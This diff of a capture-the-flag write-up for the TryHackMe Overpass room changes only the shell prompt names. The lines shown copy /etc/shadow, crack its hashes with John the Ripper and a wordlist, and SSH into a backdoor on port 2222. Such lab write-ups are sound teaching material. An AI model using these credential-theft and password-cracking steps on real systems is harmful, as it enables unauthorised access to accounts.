@@ -36,8 +36,8 @@ check the tcp stream and you will find out
 copy `/etc/shadow` to ur kali. now run john to crack it using `/usr/share/wordlists/fasttrack.txt`
 
 ```console
-kali@kali:~/THM/Overpass$ sudo john -wordlist=/usr/share/wordlists/fasttrack.txt shadow.txt
-kali@kali:~/THM/Overpass$ sudo john --show shadow.txt # check cracked password
+bibo318@parrot:~/THM/Overpass$ sudo john -wordlist=/usr/share/wordlists/fasttrack.txt shadow.txt
+bibo318@parrot:~/THM/Overpass$ sudo john --show shadow.txt # check cracked password
 ```
 
 # Research - Analyse the code 
@@ -69,7 +69,7 @@ From `main.go` we know that:
 
 so what are we waiting for? just ssh `into` it
 ```console
-kali@kali:~/THM/Overpass$ ssh $IP -p 2222
+bibo318@parrot:~/THM/Overpass$ ssh $IP -p 2222
 james@overpass-production:/home/james/ssh-backdoor$ cd ..
 james@overpass-production:/home/james$ ls
 ssh-backdoor  user.txt  www
